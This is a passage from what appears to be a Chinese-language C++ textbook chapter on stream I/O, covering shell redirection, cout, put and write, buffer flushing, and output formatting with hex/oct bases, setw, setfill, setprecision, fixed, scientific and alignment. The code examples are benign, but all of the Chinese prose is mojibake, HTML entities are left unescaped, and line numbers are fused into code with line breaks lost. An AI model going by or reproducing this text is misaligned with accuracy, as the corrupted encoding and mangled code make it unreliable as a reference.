(Redirection)**ã€‚é‡å®šå‘å…è®¸ä½ æ”¹å˜ç¨‹åºçš„æ ‡å‡†è¾“å…¥æ¥æºå’Œæ ‡å‡†è¾“å‡º/æ ‡å‡†é”™è¯¯çš„ç›®çš„åœ°ï¼Œè€Œæ— éœ€ä¿®æ”¹ç¨‹åºä»£ç **ã€‚ è¾“å‡ºé‡å®šå‘ (&gt;): å°†ç¨‹åºçš„æ ‡å‡†è¾“å‡ºï¼ˆcout çš„å†…å®¹ï¼‰å‘é€åˆ°æŒ‡å®šæ–‡ä»¶ï¼Œè€Œä¸æ˜¯å±å¹•ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œé€šå¸¸ä¼šè¦†ç›–å®ƒã€‚ 1./my_program &gt; output.txt æ‰§è¡Œ my_programï¼Œå…¶ cout è¾“å‡ºçš„å†…å®¹å°†å†™å…¥ output.txt æ–‡ä»¶ã€‚ è¾“å‡ºé‡å®šå‘ï¼ˆè¿½åŠ  &gt;&gt;): å°†ç¨‹åºçš„æ ‡å‡†è¾“å‡ºè¿½åŠ åˆ°æŒ‡å®šæ–‡ä»¶çš„æœ«å°¾ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºå®ƒã€‚ 1./my_program &gt;&gt; output.txt è¾“å…¥é‡å®šå‘ (&lt;): ä½¿ç¨‹åºä»æŒ‡å®šæ–‡ä»¶è¯»å–å…¶æ ‡å‡†è¾“å…¥ï¼ˆcin çš„å†…å®¹ï¼‰ï¼Œè€Œä¸æ˜¯ä»é”®ç›˜ã€‚ 1./my_program &lt; input.txt my_program ä¼šä» input.txt æ–‡ä»¶ä¸­è¯»å–å®ƒæœŸæœ›é€šè¿‡ cin è·å¾—çš„æ•°æ®ã€‚ é”™è¯¯é‡å®šå‘: é‡å®šå‘æ ‡å‡†é”™è¯¯ (cerr, clog) çš„æ–¹å¼å›  shell è€Œå¼‚ã€‚ bash/sh/zsh: ä½¿ç”¨ 2&gt; (è¦†ç›–) æˆ– 2&gt;&gt; (è¿½åŠ )ã€‚ 123./my_program 2&gt; error.log # é‡å®šå‘ stderr åˆ° error.log./my_program &gt; output.txt 2&gt; error.log # é‡å®šå‘ stdout å’Œ stderr./my_program &gt; combined.log 2&gt;&amp;1 # å°† stderr é‡å®šå‘åˆ° stdoutï¼Œç„¶åä¸€èµ·é‡å®šå‘åˆ°æ–‡ä»¶ Windows (cmd.exe): ç±»ä¼¼åœ°ä½¿ç”¨ 2&gt; å’Œ 2&gt;&gt;ã€‚ é‡å®šå‘æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œå®ƒå…è®¸æˆ‘ä»¬å°†ç¨‹åºçš„è¾“å…¥å’Œè¾“å‡ºä¸æ–‡ä»¶è¿æ¥èµ·æ¥ï¼Œæ–¹ä¾¿è¿›è¡Œæµ‹è¯•ã€æ—¥å¿—è®°å½•å’Œæ•°æ®å¤„ç†ï¼Œè€Œæ— éœ€ä¿®æ”¹ç¨‹åºæœ¬èº«æ¥å¤„ç†æ–‡ä»¶ I/Oã€‚ç¨‹åºä»ç„¶ä½¿ç”¨ cin, cout, cerrï¼Œä½†æ“ä½œç³»ç»Ÿè´Ÿè´£å°†è¿™äº›æ ‡å‡†æµè¿æ¥åˆ°æ–‡ä»¶ã€‚ 17.2 ä½¿ç”¨ cout è¿›è¡Œè¾“å‡ºstd::cout æ˜¯ C++ æ ‡å‡†åº“ &lt;iostream&gt; ä¸­é¢„å®šä¹‰çš„ä¸€ä¸ª ostream ç±»çš„å…¨å±€å¯¹è±¡ï¼Œé€šå¸¸è¿æ¥åˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ï¼ˆå¦‚å±å¹•ï¼‰ã€‚å®ƒæ˜¯ C++ ä¸­æœ€å¸¸ç”¨çš„è¾“å‡ºå·¥å…·ã€‚ 17.2.1 é‡è½½çš„ &lt;&lt; è¿ç®—ç¬¦cout æœ€å¸¸è§çš„ç”¨æ³•æ˜¯é…åˆæ’å…¥è¿ç®—ç¬¦ (&lt;&lt;) ä½¿ç”¨ã€‚è¿™ä¸ªè¿ç®—ç¬¦è¢«é‡è½½ (overloaded) ä»¥æ¥å— C++ ä¸­æ‰€æœ‰çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆå¦‚ int, float, double, char, æŒ‡é’ˆç±»å‹ï¼‰ä»¥åŠä¸€äº›åº“ç±»å‹ï¼ˆå¦‚ std::string, C é£æ ¼å­—ç¬¦ä¸² const char*ï¼‰ã€‚ å·¥ä½œåŸç†: cout &lt;&lt; value; è¡¨è¾¾å¼çš„å€¼æ˜¯ cout å¯¹è±¡æœ¬èº« (ostream&amp;)ã€‚ è¿™ä½¿å¾—å¯ä»¥é“¾æ¥ (chain) å¤šä¸ªæ’å…¥è¿ç®—ç¬¦ï¼šcout &lt;&lt; &quot;Value: &quot; &lt;&lt; x &lt;&lt; &quot; and &quot; &lt;&lt; y;ã€‚è¿™ä¼šè¢«è§£é‡Šä¸º ((cout &lt;&lt; &quot;Value: &quot;) &lt;&lt; x) &lt;&lt; &quot; and &quot;) &lt;&lt; y;ã€‚ &lt;&lt; è¿ç®—ç¬¦ä¼šæ ¹æ® value çš„ç±»å‹ï¼Œå°†å…¶è½¬æ¢ä¸ºé€‚å½“çš„å­—ç¬¦è¡¨ç¤ºå½¢å¼ï¼Œå¹¶å‘é€åˆ°è¾“å‡ºæµï¼ˆé€šå¸¸å…ˆåˆ°ç¼“å†²åŒºï¼‰ã€‚ ç¤ºä¾‹: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; int age = 30; double weight = 65.5; char initial = &#x27;J&#x27;; const char* name = &quot;John Doe&quot;; std::string city = &quot;New York&quot;; std::cout &lt;&lt; &quot;--- Basic Output ---&quot; &lt;&lt; std::endl; // endl æ’å…¥æ¢è¡Œç¬¦å¹¶åˆ·æ–°ç¼“å†²åŒº std::cout &lt;&lt; &quot;Name: &quot; &lt;&lt; name &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Initial: &quot; &lt;&lt; initial &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Weight: &quot; &lt;&lt; weight &lt;&lt; &quot; kg&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;City: &quot; &lt;&lt; city &lt;&lt; std::endl; // é“¾æ¥è¾“å‡º std::cout &lt;&lt; &quot;\\n--- Chained Output ---&quot; &lt;&lt; std::endl; std::cout &lt;&lt; name &lt;&lt; &quot; (&quot; &lt;&lt; initial &lt;&lt; &quot;), age &quot; &lt;&lt; age &lt;&lt; &quot;, lives in &quot; &lt;&lt; city &lt;&lt; &quot;.&quot; &lt;&lt; std::endl; // è¾“å‡ºæŒ‡é’ˆåœ°å€ (é€šå¸¸ä»¥åå…­è¿›åˆ¶æ˜¾ç¤º) int* ptr_age = &amp;age; std::cout &lt;&lt; &quot;\\nAddress of age: &quot; &lt;&lt; ptr_age &lt;&lt; std::endl; return 0;&#125; å¯¹äºç”¨æˆ·è‡ªå®šä¹‰çš„ç±»ç±»å‹ï¼Œå¦‚æœæƒ³è®© cout &lt;&lt; myObject; èƒ½å¤Ÿå·¥ä½œï¼Œéœ€è¦ä¸ºè¯¥ç±»é‡è½½ operator&lt;&lt;ï¼ˆé€šå¸¸ä½œä¸ºå‹å…ƒå‡½æ•°ï¼‰ï¼Œå¦‚ç¬¬ 11 ç« æ‰€è¿°ã€‚ 17.2.2 å…¶ä»– ostream æ–¹æ³•é™¤äº† &lt;&lt; è¿ç®—ç¬¦ï¼Œostream ç±»ï¼ˆcout æ˜¯å…¶å¯¹è±¡ï¼‰è¿˜æä¾›äº†å…¶ä»–è¾“å‡ºæ–¹æ³•ï¼š put(char c): è¾“å‡ºå•ä¸ªå­—ç¬¦ cã€‚ 123std::cout.put(&#x27;H&#x27;);std::cout.put(&#x27;i&#x27;);std::cout.put(&#x27;!&#x27;).put(&#x27;\\n&#x27;); // put() ä¹Ÿè¿”å› ostream&amp;ï¼Œå¯ä»¥é“¾æ¥ write(const char* s, streamsize n): è¾“å‡ºä»åœ°å€ s å¼€å§‹çš„å†…å­˜å—ä¸­çš„ n ä¸ªå­—èŠ‚ã€‚å®ƒä¸ä¼šåœ¨é‡åˆ°ç©ºå­—ç¬¦ \\0 æ—¶åœæ­¢ï¼Œè€Œæ˜¯ç²¾ç¡®åœ°å†™å…¥ n ä¸ªå­—èŠ‚ã€‚è¿™å¯¹äºè¾“å‡ºäºŒè¿›åˆ¶æ•°æ®æˆ–éç©ºå­—ç¬¦ç»“å°¾çš„å­—ç¬¦æ•°ç»„å¾ˆæœ‰ç”¨ã€‚ 1234567const char* message = &quot;Binary Data&quot;;// è¾“å‡ºå‰ 6 ä¸ªå­—èŠ‚ &quot;Binary&quot;std::cout.write(message, 6) &lt;&lt; std::endl;char buffer[] = &#123;&#x27;A&#x27;, &#x27;B&#x27;, &#x27;\\0&#x27;, &#x27;C&#x27;, &#x27;D&#x27;&#125;;// è¾“å‡ºæ•´ä¸ª buffer çš„ 5 ä¸ªå­—èŠ‚ï¼ŒåŒ…æ‹¬ç©ºå­—ç¬¦std::cout.write(buffer, sizeof(buffer)) &lt;&lt; std::endl; 17.2.3 åˆ·æ–°è¾“å‡ºç¼“å†²åŒºå¦‚å‰æ‰€è¿°ï¼Œè¾“å‡ºé€šå¸¸æ˜¯ç¼“å†²çš„ã€‚æœ‰æ—¶æˆ‘ä»¬éœ€è¦ç¡®ä¿ç¼“å†²åŒºä¸­çš„å†…å®¹ç«‹å³è¢«å‘é€åˆ°è¾“å‡ºè®¾å¤‡ï¼Œè¿™ç§°ä¸ºåˆ·æ–° (Flushing) ç¼“å†²åŒºã€‚ æœ‰å‡ ç§æ–¹æ³•å¯ä»¥åˆ·æ–° cout çš„ç¼“å†²åŒºï¼š std::endl (Manipulator): è¿™æ˜¯æœ€å¸¸ç”¨çš„æ–¹æ³•ã€‚endl ä¸ä»…å‘æµä¸­æ’å…¥ä¸€ä¸ªæ¢è¡Œç¬¦ (\\n)**ï¼Œè¿˜ä¼šæ˜¾å¼åˆ·æ–°**è¾“å‡ºç¼“å†²åŒºã€‚ 1std::cout &lt;&lt; &quot;Line 1&quot; &lt;&lt; std::endl; // è¾“å‡º &quot;Line 1&quot;ï¼Œæ¢è¡Œï¼Œå¹¶åˆ·æ–° std::flush (Manipulator): åªåˆ·æ–°è¾“å‡ºç¼“å†²åŒºï¼Œä¸æ’å…¥ä»»ä½•å­—ç¬¦ã€‚ 123std::cout &lt;&lt; &quot;Processing...&quot; &lt;&lt; std::flush; // ç«‹å³æ˜¾ç¤º &quot;Processing...&quot;ï¼Œä¸æ¢è¡Œ// ...é•¿æ—¶é—´æ“ä½œ...std::cout &lt;&lt; &quot; Done.&quot; &lt;&lt; std::endl; std::ends (Manipulator): å‘æµä¸­æ’å…¥ä¸€ä¸ªç©ºå­—ç¬¦ (\\0)**ï¼Œç„¶ååˆ·æ–°**ç¼“å†²åŒºã€‚è¿™åœ¨ä¸å…¶ä»–éœ€è¦ç©ºå­—ç¬¦ç»“å°¾å­—ç¬¦ä¸²çš„ç³»ç»Ÿäº¤äº’æ—¶å¯èƒ½æœ‰ç”¨ï¼Œä½†ä¸å¤ªå¸¸è§ã€‚ 1std::cout &lt;&lt; &quot;Null terminated&quot; &lt;&lt; std::ends; ç¨‹åºæ­£å¸¸ç»“æŸ: å½“ main å‡½æ•°è¿”å›æˆ–è°ƒç”¨ exit() æ—¶ï¼Œé€šå¸¸ä¼šè‡ªåŠ¨åˆ·æ–°æ‰€æœ‰æ‰“å¼€çš„è¾“å‡ºæµã€‚ ç¼“å†²åŒºæ»¡: å½“ç¼“å†²åŒºæ»¡æ—¶ä¼šè‡ªåŠ¨åˆ·æ–°ã€‚ ä¸è¾“å…¥å…³è”: å½“ cin éœ€è¦ä»ç”¨æˆ·é‚£é‡Œè¯»å–æ•°æ®ï¼Œå¹¶ä¸” cout çš„ç¼“å†²åŒºä¸­æœ‰å¾…è¾“å‡ºçš„å†…å®¹æ—¶ï¼Œé€šå¸¸ä¼šå…ˆåˆ·æ–° cout çš„ç¼“å†²åŒºï¼ˆä»¥ç¡®ä¿æç¤ºä¿¡æ¯å…ˆæ˜¾ç¤ºå‡ºæ¥ï¼‰ã€‚ endl vs. &#39;\\n&#39;: cout &lt;&lt; endl; ç­‰ä»·äº cout &lt;&lt; &#39;\\n&#39; &lt;&lt; flush; cout &lt;&lt; &#39;\\n&#39;; åªæ’å…¥æ¢è¡Œç¬¦ï¼Œä¸ä¿è¯ç«‹å³åˆ·æ–°ç¼“å†²åŒºï¼ˆé™¤éæµæ˜¯è¡Œç¼“å†²ä¸”è¿æ¥åˆ°ç»ˆç«¯ï¼‰ã€‚ åœ¨æ€§èƒ½æ•æ„Ÿçš„ä»£ç ä¸­ï¼ˆä¾‹å¦‚å¤§é‡å¾ªç¯è¾“å‡ºï¼‰ï¼Œé¢‘ç¹ä½¿ç”¨ endl å¯èƒ½ä¼šå› ä¸ºä¸å¿…è¦çš„åˆ·æ–°è€Œé™ä½æ•ˆç‡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœä¸éœ€è¦æ¯æ¬¡éƒ½ç«‹å³çœ‹åˆ°è¾“å‡ºï¼Œå¯ä»¥åªä½¿ç”¨ &#39;\\n&#39;ï¼Œè®©ç¼“å†²åŒºåœ¨æ›´åˆé€‚çš„æ—¶æœºï¼ˆå¦‚ç¼“å†²åŒºæ»¡æˆ–ç¨‹åºç»“æŸï¼‰åˆ·æ–°ã€‚ 17.2.4 ç”¨ cout è¿›è¡Œæ ¼å¼åŒ–é»˜è®¤æƒ…å†µä¸‹ï¼Œcout ä¼šæ ¹æ®æ•°æ®çš„ç±»å‹é€‰æ‹©ä¸€ç§â€œåˆç†â€çš„æ ¼å¼è¿›è¡Œè¾“å‡ºã€‚ä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼æ§åˆ¶è¾“å‡ºçš„æ ¼å¼ï¼Œä¾‹å¦‚å­—æ®µå®½åº¦ã€å°æ•°ä½æ•°ã€å¯¹é½æ–¹å¼ã€æ•°å­—åŸºæ•°ç­‰ã€‚ æ ¼å¼åŒ–å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è®¾ç½®ï¼š ios_base æˆå‘˜å‡½æ•°: ios_base ç±»ï¼ˆostream çš„åŸºç±»ï¼‰æä¾›äº†ä¸€äº›æˆå‘˜å‡½æ•°æ¥è®¾ç½®æ ¼å¼æ ‡å¿—ã€‚ æ“çºµç¬¦ (Manipulators): å®šä¹‰åœ¨ &lt;iostream&gt; å’Œ &lt;iomanip&gt; ä¸­çš„ç‰¹æ®Šå‡½æ•°ï¼Œå¯ä»¥åƒæ’å…¥å€¼ä¸€æ ·æ’å…¥åˆ° cout è¯­å¥ä¸­æ¥æ”¹å˜æµçš„çŠ¶æ€ã€‚ä½¿ç”¨æ“çºµç¬¦é€šå¸¸æ›´æ–¹ä¾¿ã€‚ 1. ä¿®æ”¹æ•°å€¼çš„åŸºæ•° (dec, hex, oct)å¯ä»¥ä½¿ç”¨æ“çºµç¬¦ dec, hex, oct æ¥æ”¹å˜æ•´æ•°è¾“å‡ºçš„åŸºæ•°ï¼ˆé»˜è®¤ä¸ºåè¿›åˆ¶ decï¼‰ã€‚è¿™äº›è®¾ç½®æ˜¯ç²˜æ€§ (sticky) çš„ï¼Œå³ä¸€æ—¦è®¾ç½®ï¼Œåç»­æ‰€æœ‰æ•´æ•°è¾“å‡ºéƒ½ä¼šé‡‡ç”¨è¯¥åŸºæ•°ï¼Œç›´åˆ°è¢«é‡æ–°è®¾ç½®ä¸ºæ­¢ã€‚ 1234567891011121314151617181920#include &lt;iostream&gt;int main() &#123; int num = 255; std::cout &lt;&lt; &quot;Default (decimal): &quot; &lt;&lt; num &lt;&lt; std::endl; // è¾“å‡º 255 std::cout &lt;&lt; std::hex; // è®¾ç½®ä¸ºåå…­è¿›åˆ¶ std::cout &lt;&lt; &quot;Hexadecimal: &quot; &lt;&lt; num &lt;&lt; std::endl; // è¾“å‡º ff std::cout &lt;&lt; std::oct; // è®¾ç½®ä¸ºå…«è¿›åˆ¶ std::cout &lt;&lt; &quot;Octal: &quot; &lt;&lt; num &lt;&lt; std::endl; // è¾“å‡º 377 std::cout &lt;&lt; std::dec; // æ¢å¤ä¸ºåè¿›åˆ¶ std::cout &lt;&lt; &quot;Decimal again: &quot; &lt;&lt; num &lt;&lt; std::endl; // è¾“å‡º 255 // é…åˆ showbase å’Œ uppercase std::cout &lt;&lt; std::showbase &lt;&lt; std::uppercase; // æ˜¾ç¤ºåŸºæ•°å‰ç¼€å¹¶ä½¿ç”¨å¤§å†™å­—æ¯ std::cout &lt;&lt; &quot;Hex with base and uppercase: &quot; &lt;&lt; std::hex &lt;&lt; num &lt;&lt; std::endl; // è¾“å‡º 0XFF std::cout &lt;&lt; &quot;Octal with base: &quot; &lt;&lt; std::oct &lt;&lt; num &lt;&lt; std::endl; // è¾“å‡º 0377 std::cout &lt;&lt; std::noshowbase &lt;&lt; std::nouppercase &lt;&lt; std::dec; // æ¢å¤é»˜è®¤ return 0;&#125; showbase: æ˜¾ç¤ºæ•°å€¼åŸºæ•°çš„å‰ç¼€ï¼ˆ0x æˆ– 0X è¡¨ç¤ºåå…­è¿›åˆ¶ï¼Œ0 è¡¨ç¤ºå…«è¿›åˆ¶ï¼‰ã€‚ noshowbase: ä¸æ˜¾ç¤ºåŸºæ•°å‰ç¼€ï¼ˆé»˜è®¤ï¼‰ã€‚ uppercase: åå…­è¿›åˆ¶è¾“å‡ºæ—¶ä½¿ç”¨å¤§å†™å­—æ¯ A-F å’Œ Xã€‚ nouppercase: ä½¿ç”¨å°å†™å­—æ¯ï¼ˆé»˜è®¤ï¼‰ã€‚ 2. è°ƒæ•´å­—æ®µå®½åº¦ (width(), setw())å¯ä»¥æŒ‡å®šè¾“å‡ºä¸‹ä¸€ä¸ªå€¼æ—¶ä½¿ç”¨çš„æœ€å°å­—æ®µå®½åº¦ã€‚å¦‚æœå€¼çš„å®é™…å®½åº¦å°äºæŒ‡å®šå®½åº¦ï¼Œåˆ™ç”¨å¡«å……å­—ç¬¦ï¼ˆé»˜è®¤ä¸ºç©ºæ ¼ï¼‰å¡«å……ã€‚ cout.width(int w) (æˆå‘˜å‡½æ•°): è®¾ç½®ä¸‹ä¸€æ¬¡è¾“å‡ºçš„æœ€å°å®½åº¦ä¸º wã€‚åªå¯¹ç´§éšå…¶åçš„ä¸‹ä¸€æ¬¡è¾“å‡ºæœ‰æ•ˆï¼Œä¹‹åä¼šè‡ªåŠ¨æ¢å¤é»˜è®¤ï¼ˆå®½åº¦ä¸º 0ï¼‰ã€‚ setw(int w) (æ“çºµç¬¦, &lt;iomanip&gt;): ä¸ width() æ•ˆæœç›¸åŒï¼Œä¹Ÿæ˜¯åªå¯¹ä¸‹ä¸€æ¬¡è¾“å‡ºæœ‰æ•ˆã€‚ä½¿ç”¨ setw é€šå¸¸æ›´æ–¹ä¾¿ã€‚ 123456789101112131415161718#include &lt;iostream&gt;#include &lt;iomanip&gt; // for setwint main() &#123; double val = 12.3; std::cout &lt;&lt; &quot;*&quot; &lt;&lt; val &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // è¾“å‡º *12.3* std::cout.width(10); // è®¾ç½®å®½åº¦ä¸º 10 std::cout &lt;&lt; &quot;*&quot; &lt;&lt; val &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // è¾“å‡º * 12.3* (å³å¯¹é½) // å®½åº¦è®¾ç½®å¤±æ•ˆ std::cout &lt;&lt; &quot;*&quot; &lt;&lt; val &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // è¾“å‡º *12.3* // ä½¿ç”¨ setw std::cout &lt;&lt; &quot;*&quot; &lt;&lt; std::setw(10) &lt;&lt; val &lt;&lt; &quot;*&quot; &lt;&lt; std::setw(5) &lt;&lt; &quot;Hi&quot; &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // è¾“å‡º * 12.3* Hi* return 0;&#125; 3. å¡«å……å­—ç¬¦ (fill())å½“å­—æ®µå®½åº¦å¤§äºå€¼çš„å®é™…å®½åº¦æ—¶ï¼Œç”¨äºå¡«å……ç©ºç™½åŒºåŸŸçš„å­—ç¬¦å¯ä»¥é€šè¿‡ fill() æˆå‘˜å‡½æ•°æˆ– setfill() æ“çºµç¬¦è®¾ç½®ã€‚è¿™ä¸ªè®¾ç½®æ˜¯ç²˜æ€§çš„ã€‚ cout.fill(char ch) (æˆå‘˜å‡½æ•°): è®¾ç½®å¡«å……å­—ç¬¦ä¸º chã€‚è¿”å›ä¹‹å‰çš„å¡«å……å­—ç¬¦ã€‚ setfill(char ch) (æ“çºµç¬¦, &lt;iomanip&gt;): è®¾ç½®å¡«å……å­—ç¬¦ä¸º chã€‚ 12345678910111213141516#include &lt;iostream&gt;#include &lt;iomanip&gt; // for setw, setfillint main() &#123; int num = 42; std::cout &lt;&lt; &quot;Default fill: *&quot; &lt;&lt; std::setw(6) &lt;&lt; num &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // è¾“å‡º * 42* std::cout.fill(&#x27;*&#x27;); // è®¾ç½®å¡«å……å­—ç¬¦ä¸º &#x27;*&#x27; std::cout &lt;&lt; &quot;Star fill: *&quot; &lt;&lt; std::setw(6) &lt;&lt; num &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // è¾“å‡º ****42* // ä½¿ç”¨ setfill std::cout &lt;&lt; &quot;Dash fill: *&quot; &lt;&lt; std::setfill(&#x27;-&#x27;) &lt;&lt; std::setw(6) &lt;&lt; num &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // è¾“å‡º ----42* std::cout.fill(&#x27; &#x27;); // æ¢å¤é»˜è®¤å¡«å……å­—ç¬¦ return 0;&#125; 4. æµ®ç‚¹æ•°ç²¾åº¦ (precision(), setprecision())å¯ä»¥æ§åˆ¶æµ®ç‚¹æ•°è¾“å‡ºçš„å°æ•°ä½æ•°æˆ–æ€»æœ‰æ•ˆæ•°å­—ä½æ•°ï¼Œå…·ä½“å–å†³äºæµ®ç‚¹æ•°æ ¼å¼ï¼ˆè§ä¸‹æ–‡ï¼‰ã€‚ cout.precision(int p) (æˆå‘˜å‡½æ•°): è®¾ç½®ç²¾åº¦ä¸º pã€‚è¿”å›ä¹‹å‰çš„ç²¾åº¦å€¼ã€‚é»˜è®¤ç²¾åº¦é€šå¸¸æ˜¯ 6ã€‚è¿™ä¸ªè®¾ç½®æ˜¯ç²˜æ€§çš„ã€‚ setprecision(int p) (æ“çºµç¬¦, &lt;iomanip&gt;): è®¾ç½®ç²¾åº¦ä¸º pã€‚ 1234567891011121314151617#include &lt;iostream&gt;#include &lt;iomanip&gt; // for setprecision#include &lt;cmath&gt; // for M_PIint main() &#123; double pi = M_PI; // å¤§çº¦ 3.14159265... std::cout &lt;&lt; &quot;Default precision: &quot; &lt;&lt; pi &lt;&lt; std::endl; // é€šå¸¸è¾“å‡º 6 ä½æœ‰æ•ˆæ•°å­— std::cout.precision(4); // è®¾ç½®ç²¾åº¦ä¸º 4 std::cout &lt;&lt; &quot;Precision 4: &quot; &lt;&lt; pi &lt;&lt; std::endl; // è¾“å‡º 3.142 (é»˜è®¤æ¨¡å¼ä¸‹æ˜¯æœ‰æ•ˆæ•°å­—) // ä½¿ç”¨ setprecision std::cout &lt;&lt; &quot;Precision 8: &quot; &lt;&lt; std::setprecision(8) &lt;&lt; pi &lt;&lt; std::endl; // è¾“å‡º 3.1415927 std::cout.precision(6); // æ¢å¤é»˜è®¤ç²¾åº¦ return 0;&#125; 5. æµ®ç‚¹æ•°æ ¼å¼ (setf(), unsetf(), fixed, scientific)å¯ä»¥æ§åˆ¶æµ®ç‚¹æ•°æ˜¯ä»¥å®šç‚¹è¡¨ç¤ºæ³• (fixed) è¿˜æ˜¯ç§‘å­¦è®¡æ•°æ³• (scientific) æ˜¾ç¤ºã€‚ fixed (æ“çºµç¬¦): ä½¿ç”¨å®šç‚¹è¡¨ç¤ºæ³•ã€‚æ­¤æ—¶ï¼Œprecision() æ§åˆ¶çš„æ˜¯å°æ•°ç‚¹åçš„ä½æ•°ã€‚ scientific (æ“çºµç¬¦): ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ï¼ˆä¾‹å¦‚ 1.23e+04ï¼‰ã€‚æ­¤æ—¶ï¼Œprecision() æ§åˆ¶çš„æ˜¯å°æ•°ç‚¹åçš„ä½æ•°ã€‚ é»˜è®¤æ ¼å¼: å¦‚æœæ—¢æœªè®¾ç½® fixed ä¹Ÿæœªè®¾ç½® scientificï¼Œåˆ™ cout ä¼šè‡ªåŠ¨é€‰æ‹©ä¸€ç§æ ¼å¼ï¼ˆå®šç‚¹æˆ–ç§‘å­¦è®¡æ•°æ³•ï¼‰ï¼Œä»¥äº§ç”Ÿæ›´ç´§å‡‘çš„è¡¨ç¤ºã€‚æ­¤æ—¶ï¼Œprecision() æ§åˆ¶çš„æ˜¯æ€»çš„æœ‰æ•ˆæ•°å­—ä½æ•°ï¼ˆæ•´æ•°éƒ¨åˆ†+å°æ•°éƒ¨åˆ†ï¼‰ã€‚ ios_base::floatfield: fixed å’Œ scientific éƒ½æ˜¯æ ¼å¼æ ‡å¿—ä½ã€‚å¯ä»¥ä½¿ç”¨ cout.setf(ios_base::fixed, ios_base::floatfield) å’Œ cout.setf(ios_base::scientific, ios_base::floatfield) æ¥è®¾ç½®ï¼Œä½¿ç”¨ cout.unsetf(ios_base::floatfield) æ¥æ¸…é™¤è®¾ç½®æ¢å¤é»˜è®¤è¡Œä¸ºã€‚ä½¿ç”¨æ“çºµç¬¦é€šå¸¸æ›´ç®€å•ã€‚ 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;iomanip&gt; // for fixed, scientific, setprecisionint main() &#123; double num1 = 12345.6789; double num2 = 0.000012345; std::cout &lt;&lt; std::setprecision(5); // è®¾ç½®ç²¾åº¦ä¸º 5 std::cout &lt;&lt; &quot;Default format:\\n&quot;; std::cout &lt;&lt; num1 &lt;&lt; &quot;\\t&quot; &lt;&lt; num2 &lt;&lt; std::endl; // è¾“å‡º 12346 1.2345e-05 (ç²¾åº¦5è¡¨ç¤ºæœ‰æ•ˆæ•°å­—) std::cout &lt;&lt; std::fixed; // è®¾ç½®ä¸ºå®šç‚¹æ ¼å¼ std::cout &lt;&lt; &quot;Fixed format:\\n&quot;; std::cout &lt;&lt; num1 &lt;&lt; &quot;\\t&quot; &lt;&lt; num2 &lt;&lt; std::endl; // è¾“å‡º 12345.67890 0.00001 (ç²¾åº¦5è¡¨ç¤ºå°æ•°ä½æ•°) std::cout &lt;&lt; std::scientific; // è®¾ç½®ä¸ºç§‘å­¦è®¡æ•°æ³•æ ¼å¼ std::cout &lt;&lt; &quot;Scientific format:\\n&quot;; std::cout &lt;&lt; num1 &lt;&lt; &quot;\\t&quot; &lt;&lt; num2 &lt;&lt; std::endl; // è¾“å‡º 1.23457e+04 1.23450e-05 (ç²¾åº¦5è¡¨ç¤ºå°æ•°ä½æ•°) // æ¢å¤é»˜è®¤æ ¼å¼ (éœ€è¦æ¸…é™¤ floatfield) std::cout.unsetf(std::ios_base::floatfield); std::cout &lt;&lt; &quot;Back to default format:\\n&quot;; std::cout &lt;&lt; num1 &lt;&lt; &quot;\\t&quot; &lt;&lt; num2 &lt;&lt; std::endl; // è¾“å‡º 12346 1.2345e-05 return 0;&#125; 6. å…¶ä»–æ ¼å¼æ ‡å¿—å’Œæ“çºµç¬¦ å¯¹é½æ–¹å¼ (left, right, internal): left: åœ¨å­—æ®µå†…å·¦å¯¹é½è¾“å‡ºï¼Œå¡«å……å­—ç¬¦æ”¾åœ¨å³è¾¹ã€‚ right: åœ¨å­—æ®µå†…å³å¯¹é½è¾“å‡ºï¼Œå¡«å……å­—ç¬¦æ”¾åœ¨å·¦è¾¹ï¼ˆé»˜è®¤ï¼‰ã€‚ internal: ç¬¦å·ï¼ˆæ­£è´Ÿå·æˆ–åŸºæ•°å‰ç¼€ï¼‰å·¦å¯¹é½ï¼Œæ•°å€¼å³å¯¹é½ï¼Œå¡«å……å­—ç¬¦æ”¾åœ¨ä¸­é—´ã€‚ å¯ä»¥é€šè¿‡ setf() è®¾ç½® ios_base::left, ios_base::right, ios_base::internal æ ‡å¿—ï¼Œæˆ–ä½¿ç”¨åŒåæ“çºµç¬¦ã€‚ 1234std::cout &lt;&lt; &quot;*&quot; &lt;&lt; std::setw(10) &lt;&lt; std::left &lt;&lt; &quot;Hi&quot; &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // è¾“å‡º *Hi *std::cout &lt;&lt; &quot;*&quot; &lt;&lt; std::setw(10) &lt;&lt; std::right &lt;&lt; -12 &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // è¾“å‡º * -12*std::cout &lt;&lt; &quot;*&quot; &lt;&lt; std::setw(10) &lt;&lt; std::internal &lt;&lt; -12 &lt;&lt; &quot;*&quot; &lt;&lt; std::endl; // è¾“å‡º *- 12*std::cout &lt;&lt; std::right; // æ¢å¤é»˜è®¤å³å¯¹é½ æ˜¾ç¤ºå°æ•°ç‚¹ (showpoint, noshowpoint): showpoint: å¼ºåˆ¶æ˜¾ç¤ºæµ®ç‚¹æ•°çš„å°æ•°ç‚¹å’Œæœ«å°¾çš„é›¶ï¼ˆå³ä½¿å°æ•°éƒ¨åˆ†ä¸ºé›¶ï¼‰ã€‚ noshowpoint: 